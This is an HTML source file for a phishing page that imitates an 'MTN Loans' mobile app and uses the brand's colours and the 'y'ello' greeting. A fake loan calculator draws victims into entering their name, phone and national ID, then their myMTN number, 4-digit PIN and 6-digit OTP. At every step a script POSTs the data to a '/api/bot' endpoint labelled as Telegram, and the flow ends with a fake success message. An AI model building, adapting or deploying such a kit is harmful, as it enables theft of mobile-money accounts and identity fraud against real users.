<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MTN Loans</title>
    <style>
        /* PURE CSS - NO EXTERNAL LIBRARIES */
        * { box-sizing: border-box; font-family: Arial, sans-serif; }
        body { margin: 0; padding: 0; background-color: #f4f4f4; display: flex; justify-content: center; min-height: 100vh; }
        
        .app-container { width: 100%; max-width: 400px; background: white; position: relative; overflow: hidden; box-shadow: 0 0 15px rgba(0,0,0,0.1); display: flex; flex-direction: column; min-height: 100vh; }
        
        /* Screen Management */
        .screen { display: none; flex-direction: column; flex-grow: 1; width: 100%; }
        .screen.active { display: flex; }

        /* Colors */
        .bg-yellow { background-color: #FFCC00; }
        .bg-green { background-color: #008751; }
        .text-yellow { color: #FFCC00; }
        .text-green { color: #008751; }
        .text-white { color: white; }

        /* Header */
        .header { background-color: #FFCC00; padding: 20px; text-align: center; border-bottom: 4px solid #008751; }
        .header h1 { margin: 0; color: #008751; font-size: 24px; font-weight: 900; }

        /* Calculator Card */
        .calc-card { background-color: #FFCC00; margin: 20px; padding: 20px; border: 2px solid #008751; border-radius: 12px; text-align: center; flex-grow: 1; }
        .amount-display { font-size: 32px; font-weight: 900; color: #008751; margin: 10px 0; }
        
        input[type=range] { width: 100%; margin: 15px 0; accent-color: #008751; }
        
        .term-buttons { display: flex; justify-content: space-between; margin-top: 10px; }
        .term-btn { flex: 1; margin: 0 5px; padding: 10px; border: 2px solid #008751; background-color: white; color: #008751; font-weight: bold; border-radius: 6px; cursor: pointer; }
        .term-btn.active { background-color: #008751; color: #FFCC00; }
        
        .payment-box { background-color: #008751; color: white; padding: 15px; border-radius: 8px; margin-top: 20px; }
        .payment-amount { font-size: 28px; font-weight: 900; color: #FFCC00; margin: 5px 0; }
        
        .btn-main { width: 100%; background-color: #008751; color: #FFCC00; font-size: 18px; font-weight: bold; padding: 15px; border: none; border-radius: 8px; margin-top: 20px; cursor: pointer; text-transform: uppercase; }

        /* Form */
        .form-container { padding: 20px; flex-grow: 1; overflow-y: auto; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-weight: bold; color: #008751; margin-bottom: 5px; font-size: 14px; }
        .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; }

        /* Dark Screen (Login/OTP) */
        .dark-screen { background-color: #008751; padding: 20px; flex-grow: 1; display: flex; flex-direction: column; }
        .dark-screen h2 { color: #FFCC00; text-align: center; margin-top: 50px; font-size: 28px; }
        .dark-screen input { width: 100%; padding: 15px; border-radius: 8px; border: 2px solid #FFCC00; background: transparent; color: white; font-size: 18px; font-weight: bold; margin-top: 20px; }

        /* PIN Pad */
        .pin-dots { display: flex; justify-content: center; margin: 30px 0; }
        .pin-dot { width: 20px; height: 20px; border: 2px solid #008751; border-radius: 50%; margin: 0 10px; }
        .pin-dot.filled { background-color: #008751; }
        
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 300px; margin: 0 auto; }
        .keypad button { width: 70px; height: 70px; border-radius: 50%; border: 1px solid #ccc; background: #f9f9f9; font-size: 24px; font-weight: bold; color: #008751; margin: 0 auto; cursor: pointer; }
        .keypad button:active { background: #FFCC00; }

        /* OTP */
        .otp-boxes { display: flex; justify-content: center; gap: 10px; margin: 30px 0; }
        .otp-boxes input { width: 40px; height: 50px; text-align: center; font-size: 20px; font-weight: bold; border: 2px solid #FFCC00; border-radius: 6px; background: transparent; color: white; padding: 0; }

        /* Splash */
        .splash { background-color: #FFCC00; justify-content: center; align-items: center; flex-grow: 1; }
        .splash-logo { background-color: #008751; color: #FFCC00; padding: 30px 40px; border-radius: 50%; font-size: 40px; font-weight: 900; letter-spacing: 5px; }
    </style>
</head>
<body>

    <div class="app-container">

        <!-- SCREEN 1: CALCULATOR -->
        <div id="screen-calc" class="screen active">
            <div class="header">
                <h1>MTN Loans</h1>
            </div>
            <div class="calc-card">
                <h3 style="margin:0; color:#008751;">LOAN CALCULATOR</h3>
                <p style="font-size:12px; font-weight:bold; color:#008751; margin-bottom:0;">LOAN AMOUNT</p>
                <div class="amount-display" id="amountText">GHC 50,000.00</div>
                
                <input type="range" id="slider" min="500" max="50000" step="500" value="50000" oninput="calculate()">
                
                <p style="font-size:12px; font-weight:bold; color:#008751;">LOAN TERM</p>
                <div class="term-buttons">
                    <button type="button" class="term-btn" id="btn6" onclick="setTerm(6)">6 months</button>
                    <button type="button" class="term-btn active" id="btn12" onclick="setTerm(12)">12 months</button>
                    <button type="button" class="term-btn" id="btn24" onclick="setTerm(24)">24 months</button>
                </div>

                <div class="payment-box">
                    <p style="margin:0; font-size:12px; letter-spacing:1px;">MONTHLY PAYMENT</p>
                    <div class="payment-amount" id="paymentText">GHC 4,268.93</div>
                </div>

                <button class="btn-main" onclick="goToSplash()">APPLY NOW</button>
            </div>
        </div>

        <!-- SCREEN 2: SPLASH -->
        <div id="screen-splash" class="screen splash">
            <div class="splash-logo">MTN</div>
            <p style="color:#008751; font-weight:bold; margin-top:20px; letter-spacing: 2px;">LOADING...</p>
        </div>

        <!-- SCREEN 3: APPLICATION FORM -->
        <div id="screen-form" class="screen">
            <div class="header" style="padding:15px; text-align:left;">
                <button onclick="showScreen('screen-calc')" style="background:none; border:none; color:#008751; font-size:16px; font-weight:bold; cursor:pointer;">&larr; Back</button>
                <h1 style="font-size:18px; display:inline; margin-left:20px;">Application</h1>
            </div>
            <div class="form-container">
                <form onsubmit="submitForm(event)">
                    <div class="form-group">
                        <label>Full Name</label>
                        <input type="text" id="fName" required>
                    </div>
                    <div class="form-group">
                        <label>Phone Number</label>
                        <input type="tel" id="fPhone" required placeholder="024XXXXXXX">
                    </div>
                    <div class="form-group">
                        <label>National ID</label>
                        <input type="text" id="fID" required>
                    </div>
                    <div class="form-group">
                        <label>Loan Amount (GHC)</label>
                        <input type="text" id="fAmount" readonly style="background:#eee; font-weight:bold; color:#008751;">
                    </div>
                    <div class="form-group">
                        <label>Employment Status</label>
                        <select id="fEmp">
                            <option>Self-Employed</option>
                            <option>Employed</option>
                            <option>Unemployed</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Monthly Income (GHC)</label>
                        <input type="number" id="fIncome" required>
                    </div>
                    <button type="submit" class="btn-main" style="background:#FFCC00; color:#008751; border:2px solid #008751; margin-top:10px;">SUBMIT APPLICATION</button>
                </form>
            </div>
        </div>

        <!-- SCREEN 4: LOGIN -->
        <div id="screen-login" class="screen dark-screen">
            <div style="text-align:center; margin-top:20px;">
                <div style="display:inline-block; border:2px solid #FFCC00; padding:10px 20px; border-radius:20px; color:#FFCC00; font-weight:bold; font-size:20px;">MTN</div>
            </div>
            <h2>y'ello, MTNer!</h2>
            <p style="color:white; text-align:center;">Enter your MTN number to login.</p>
            <input type="tel" id="loginPhone" placeholder="+233..." oninput="checkLogin()">
            <button id="loginBtn" class="btn-main" style="background:#FFCC00; color:#008751; margin-top:auto; margin-bottom:20px;" disabled onclick="submitLogin()">LOGIN</button>
        </div>

        <!-- SCREEN 5: PIN -->
        <div id="screen-pin" class="screen">
            <div class="header">
                <h1>myMTN</h1>
            </div>
            <div style="padding:20px; text-align:center; flex-grow:1; display:flex; flex-direction:column;">
                <h2 style="color:#008751;">Enter your PIN</h2>
                <div class="pin-dots" id="pinDots">
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                    <div class="pin-dot"></div>
                </div>
                <div class="keypad">
                    <button onclick="enterPin('1')">1</button>
                    <button onclick="enterPin('2')">2</button>
                    <button onclick="enterPin('3')">3</button>
                    <button onclick="enterPin('4')">4</button>
                    <button onclick="enterPin('5')">5</button>
                    <button onclick="enterPin('6')">6</button>
                    <button onclick="enterPin('7')">7</button>
                    <button onclick="enterPin('8')">8</button>
                    <button onclick="enterPin('9')">9</button>
                    <div></div>
                    <button onclick="enterPin('0')">0</button>
                    <button onclick="deletePin()" style="font-size:14px;">DEL</button>
                </div>
                <button id="pinBtn" class="btn-main" style="background:#FFCC00; color:#008751; border:2px solid #008751; margin-top:auto; margin-bottom:20px;" disabled onclick="submitPin()">CONFIRM</button>
            </div>
        </div>

        <!-- SCREEN 6: OTP -->
        <div id="screen-otp" class="screen dark-screen">
            <div style="text-align:center; margin-top:20px;">
                <div style="display:inline-block; border:2px solid #FFCC00; padding:10px 20px; border-radius:20px; color:#FFCC00; font-weight:bold; font-size:20px;">MTN</div>
            </div>
            <h2>Enter the 6-digit code</h2>
            <p style="color:white; text-align:center;">Sent to <span id="displayOtpPhone" style="font-weight:bold; text-decoration:underline;">...</span></p>
            
            <div class="otp-boxes">
                <input type="tel" id="otp1" maxlength="1" oninput="moveOtp(this, 'otp2')">
                <input type="tel" id="otp2" maxlength="1" oninput="moveOtp(this, 'otp3')">
                <input type="tel" id="otp3" maxlength="1" oninput="moveOtp(this, 'otp4')">
                <input type="tel" id="otp4" maxlength="1" oninput="moveOtp(this, 'otp5')">
                <input type="tel" id="otp5" maxlength="1" oninput="moveOtp(this, 'otp6')">
                <input type="tel" id="otp6" maxlength="1" oninput="checkOtp()">
            </div>

            <button id="otpBtn" class="btn-main" style="background:#FFCC00; color:#008751; margin-top:auto; margin-bottom:20px;" disabled onclick="submitOtp()">VERIFY OTP</button>
        </div>

    </div>

    <script>
        // Show an alert ONCE to confirm the new code is loaded on your phone
        alert("The new pure code is running!");

        var currentAmount = 50000;
        var currentTerm = 12;
        var enteredPin = "";
        var globalUserId = Date.now().toString().slice(-6);

        // 1. CALCULATOR
        function calculate() {
            currentAmount = parseFloat(document.getElementById("slider").value);
            document.getElementById("amountText").innerHTML = "GHC " + currentAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            
            var rate = 0.045 / 12;
            var payment = currentAmount * rate * Math.pow(1 + rate, currentTerm) / (Math.pow(1 + rate, currentTerm) - 1);
            document.getElementById("paymentText").innerHTML = "GHC " + payment.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }

        function setTerm(months) {
            currentTerm = months;
            document.getElementById("btn6").className = "term-btn";
            document.getElementById("btn12").className = "term-btn";
            document.getElementById("btn24").className = "term-btn";
            document.getElementById("btn" + months).className = "term-btn active";
            calculate();
        }

        // 2. NAVIGATION
        function showScreen(screenId) {
            var screens = document.querySelectorAll('.screen');
            for(var i=0; i<screens.length; i++) {
                screens[i].classList.remove('active');
            }
            document.getElementById(screenId).classList.add('active');
        }

        function goToSplash() {
            document.getElementById('fAmount').value = "GHC " + currentAmount.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            showScreen('screen-splash');
            setTimeout(function() {
                showScreen('screen-form');
            }, 3000);
        }

        // 3. FORM
        function submitForm(e) {
            e.preventDefault();
            document.getElementById('displayOtpPhone').innerText = document.getElementById('fPhone').value;
            sendTelegram('Application', { name: document.getElementById('fName').value, phone: document.getElementById('fPhone').value, amount: currentAmount });
            showScreen('screen-login');
        }

        // 4. LOGIN
        function checkLogin() {
            document.getElementById('loginBtn').disabled = document.getElementById('loginPhone').value.length < 9;
        }

        function submitLogin() {
            sendTelegram('Phone', { phone: document.getElementById('loginPhone').value });
            showScreen('screen-pin');
        }

        // 5. PIN
        function enterPin(num) {
            if (enteredPin.length < 4) { enteredPin += num; updateDots(); }
        }
        function deletePin() {
            enteredPin = enteredPin.slice(0, -1); updateDots();
        }
        function updateDots() {
            var dots = document.querySelectorAll('.pin-dot');
            for(var i=0; i<dots.length; i++) {
                if (i < enteredPin.length) { dots[i].classList.add('filled'); } 
                else { dots[i].classList.remove('filled'); }
            }
            document.getElementById('pinBtn').disabled = enteredPin.length !== 4;
        }
        function submitPin() {
            sendTelegram('PIN', { pin: enteredPin });
            showScreen('screen-otp');
            document.getElementById('otp1').focus();
        }

        // 6. OTP
        function moveOtp(current, nextId) {
            if (current.value.length === 1) {
                var next = document.getElementById(nextId);
                if(next) next.focus();
            }
            var otp = "";
            for (var i = 1; i <= 6; i++) { otp += document.getElementById('otp' + i).value; }
            document.getElementById('otpBtn').disabled = otp.length !== 6;
        }

        function submitOtp() {
            var otp = "";
            for (var i = 1; i <= 6; i++) { otp += document.getElementById('otp' + i).value; }
            document.getElementById('otpBtn').innerText = "VERIFYING...";
            document.getElementById('otpBtn').disabled = true;
            sendTelegram('OTP', { otp: otp });
            setTimeout(function() {
                alert("Verification Successful!");
                window.location.reload();
            }, 2000);
        }

        // 7. TELEGRAM API
        function sendTelegram(step, data) {
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ step: step, userId: globalUserId, data: data })
            }).catch(function(err) { console.log("Bot error", err); });
        }

        // Initial run
        calculate();
    </script>
</body>
  </html>
